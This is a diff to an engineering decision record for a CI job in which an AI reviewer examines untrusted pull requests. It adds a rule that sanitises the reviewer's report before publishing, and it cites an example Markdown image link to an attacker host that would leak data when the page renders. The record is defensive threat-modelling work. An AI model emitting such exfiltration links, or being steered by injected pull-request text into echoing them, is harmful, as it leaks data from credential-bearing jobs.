@@ -459,6 +459,39 @@ No new dependency, service or runtime is introduced.
    context, so the tree being non-authoritative is stated to the reviewer rather than
    only recorded here -- which is what an earlier revision of this Decision got wrong
    by calling it a "stated caveat" while never stating it.
+22. **The report is published by this repository, with render-time fetches removed.**
+   The action's `display_report` input documents itself as outputting
+   "Claude-authored content in the GitHub Step Summary" and says it "should only be
+   used in cases where the action is used solely with trusted input". This job's input
+   is a candidate Pull Request, which is untrusted by definition, so that setting is
+   `false`.
+
+   The hazard is specific and is the one channel every other rule here misses. Rules
+   9, 12, 15, 20 and 21 all govern what the reviewer **reads**. This one governs what
+   it **publishes**. A step summary renders Markdown, including images, so a report
+   that echoes attacker-supplied text can carry `![](https://attacker/?q=...)` which
+   the browser fetches when the page is rendered, with no click and from a
+   credential-bearing job's output. The action's own tests confirm its formatter
+   preserves Markdown images.
+
+   A committed script therefore reads the execution file the action exposes, extracts
+   the reviewer's final text, and neutralises every render-time fetch vector before
+   appending it to the summary: an image becomes literal text whether inline or
+   reference-style, raw HTML is escaped since GitHub's Markdown admits `<img>`,
+   and `javascript:`, `data:` and `vbscript:` URLs are defused. Fenced code is passed
+   through unchanged, because nothing inside a fence renders and a report about code is
+   unreadable if its code is escaped. The report is bounded and truncated with a
+   notice. The step runs on `always()`, so a failed reviewer is visible rather than
+   silent.
+
+   The contract test asserts the neutralised output carries none of those vectors
+   **and** that the same checks fire on the raw input, since a sanitiser test that
+   cannot fail proves nothing.
+
+23. **The session is bounded in turns.** `--max-turns` caps how long the reviewer may
+   iterate. The prompt bound of rule 3 limits what the session starts with; this limits
+   what it can accumulate while running.
+
 ## Accepted trade: delivery is no longer on the Pull Request
 
 Agent mode sets `claudeCommentId: undefined` and provides **no GitHub
@@ -466,15 +499,51 @@ comment-posting tool**. A review therefore cannot post itself to the Pull
 Request through the action.
 
 Posting would require write scope on `GITHUB_TOKEN`, which Decision 0093 rule 4
-forbids. That rule is not amended here. Results are delivered through
-`display_report: true`, which writes the report to the workflow run's step
-summary.
+forbids. That rule is not amended here. Results are delivered to the workflow run's
+step summary -- but written by this repository rather than by the action, for the
+reason rule 22 records.
 
 The consequence is explicit: **bounded context is bought at the cost of inline
 Pull Request delivery.** The review is durable and linkable from the run, but it
 is not in the Pull Request record and peer reviewers do not see it. Restoring
 on-Pull-Request delivery without widening `GITHUB_TOKEN` is a separate question
 and is not admitted by this Decision.
+
+## Alternatives considered and not taken
+
+Recorded because two of them would have been cheaper than what was built, and a
+Decision that omits that is not an honest record.
+
+**Filtering the comments instead of removing them.** The action accepts
+`exclude_comments_by_actor`, with wildcards such as `*[bot]`. On the Pull Request where
+the reviewer first failed, the volume was almost entirely bot reviewers repeating long
+summaries, so one line would very likely have restored it **without changing modes at
+all**. It was not taken for two reasons. It filters rather than bounds: enough human
+comments reach the same wall, so the failure returns rather than ends. And it keeps tag
+mode, which the action runs with `--permission-mode acceptEdits` and
+`Bash(git add|commit|rm)` plus a push wrapper -- write access to the working tree and to
+the repository, in a job holding the credential. Agent mode's exposure is smaller, not
+larger; the tool grant that had to be added back for retrieval is gone entirely as of
+rule 12.
+
+**`--max-turns` alone.** A turn cap bounds accumulation during a session but not what
+the session begins with, which is what actually failed. It is adopted as rule 23
+alongside the prompt bound rather than instead of it.
+
+**An unprivileged producer with a privileged consumer.** CodeQL's own query
+documentation endorses this as an alternative to not checking out at all, and it would
+recover the post-change file state that rule 21 gives up. It is not taken here because
+for `pull_request` events the producing workflow comes from the candidate's own head, so
+its artifact is contributor-controlled and the `upload-artifact` digest proves only that
+it arrived unaltered, not that it is honest. Verifying each file against the
+comparison's blob `sha` would close that, and it is captured as a tracked Work Item
+rather than implemented under this Decision.
+
+**Per-file review with relevance filtering.** The published pattern for large changes is
+retrieval of the relevant parts rather than the whole diff under a cap, and smaller
+models are reported to lose accuracy when given too much. This Decision bounds the whole
+and lets the reviewer page through `patches/`; bounding per file instead is a different
+shape and is not admitted here.
 
 ## Partial supersession of Decision 0093 rule 8
 
@@ -538,7 +607,7 @@ every admitted trigger payload, the resolved-base diff, the declared entry route
 and its line-safe recoverable parts, the provider-built comparison and its cap
 notices, the exact-base file context with its merge-base source, rename handling, non-plain-file
 refusals, named budget drops and collision-free manifest, the absence of any
-candidate checkout,
+candidate checkout, the sanitised report publication and the turn bound,
 the no-Pull-Request path, the forwarded inline location, the trust gate on
 externally authored issue text, the agreement between the tool grant and the
 requested permissions, the recorded supersession, and the explicit delivery path — alongside every existing Decision 0093
